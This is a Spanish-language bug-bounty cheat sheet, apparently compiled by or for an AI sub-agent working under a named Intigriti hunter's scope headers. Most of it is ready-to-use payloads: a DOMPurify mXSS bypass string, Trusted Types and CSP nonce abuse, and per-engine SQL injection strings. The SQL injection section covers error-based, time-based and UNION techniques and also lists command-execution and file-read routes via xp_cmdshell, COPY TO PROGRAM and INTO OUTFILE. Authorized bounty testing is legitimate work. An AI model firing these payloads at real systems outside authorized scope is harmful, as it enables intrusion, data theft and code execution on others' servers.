# Catalogo XSS + SQLi 2026 (mrpuff0420) — Sesion 4 (sub-agente)

## 1. XSS en sinks reales
- Detectar en bundles: `.innerHTML=`, `.outerHTML`, `insertAdjacentHTML`, `dangerouslySetInnerHTML:{__html:`, `v-html` (Vue), `[innerHTML]` (Angular), `document.write`, `eval`, `setAttribute('src')`.
- Trazar data: location/URLSearchParams/postMessage/API -> sink sin createPolicy.
- Stored (DPG High): perfiles/comentarios -> innerHTML.
- Evasion sanitizers:
  - DOMPurify: mXSS namespace confusion `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`. Revisar version (DOMPurify.version) y config permisiva (ADD_TAGS, CUSTOM_ELEMENT_HANDLING.tagNameCheck, WHOLE_DOCUMENT).
  - sanitize-html: bypass via nonTextTags (textarea/option/xmp) entity-decodificado (GHSA-9mrh-v2v3-xpfm / CVE-2026-40186).
  - mXSS: <noscript>/<template> reparse, namespace confusion HTML/SVG/MathML.
- CSP strict / Trusted Types: si policy debil (createHTML:(i)=>i) inyectar por ella. nonce+JSONP/Angular allowlist: gadget ng-on-error, robar nonce.

## 2. SQLi por engine (DPG Critical)
| Engine | Version func | Error/comportamiento |
|---|---|---|
| MySQL | @@version/version() | "You have an error in your SQL syntax", 'a''b' concat, # comment |
| Postgres | version() | "invalid input syntax for integer", solo || concat, ::int cast |
| MSSQL | @@version | "Unclosed quotation mark", + concat, CONVERT errores |
| SQLite | sqlite_version() | "unrecognized token", || concat |

Payloads:
- Error-based: MySQL `EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version)))`; PG `CAST((SELECT version()) AS int)`; MSSQL `CONVERT(int,(SELECT @@version))`.
- Blind time-based: MySQL `SLEEP(10)`/`BENCHMARK(5000000,MD5(1))`; PG `||pg_sleep(10)--`; MSSQL `WAITFOR DELAY '0:0:10'`; SQLite (sin sleep) `AND 1=LIKE('ABC',UPPER(HEX(RANDOMBLOB(300000000/2))))`.
- UNION: salida reflejada, ajustar columnas (`ORDER BY`/`NULL`).
- RCE/lectura: MSSQL xp_cmdshell; PG pg_read_file/COPY...TO PROGRAM; MySQL LOAD_FILE/INTO OUTFILE.
- Cual usar: error visible->error-based; salida reflejada->UNION; sin salida/error->time-based (5-10s, <20-30s).

## 3. Pasos manuales (sin scanners)
1. Header scope: DPG `X-Intigriti-Username: mrpuff0420`; Aikido `X-Intigriti: mrpuff0420`.
2. Rate <=5 req/s (Burp Repeater throttle, NO Intruder/sqlmap/nuclei).
3. XSS: canario `zqx'"<svg>` -> observar reflejo/DOM -> confirmar sink -> payload `alert(document.domain)`.
4. SQLi: `'` -> error -> time-based por engine -> confirmar diferencial (repite 2x).

## 4. Red flags
- DPG XSS /abonnementen = dup/OOS. UUID IDOR sin enumeracion = no pagable. Scanners = ban.
- DPG comparte codebase 14 marcas -> 1 issue multi-marca.

## Practica lab (S4)
- DB fingerprint: error -> SQLITE_ERROR (engine identificado).
- SQLi UNION sqlite_master -> schema leak OK.
- XSS reflected: SPA render en browser (no en API JSON).
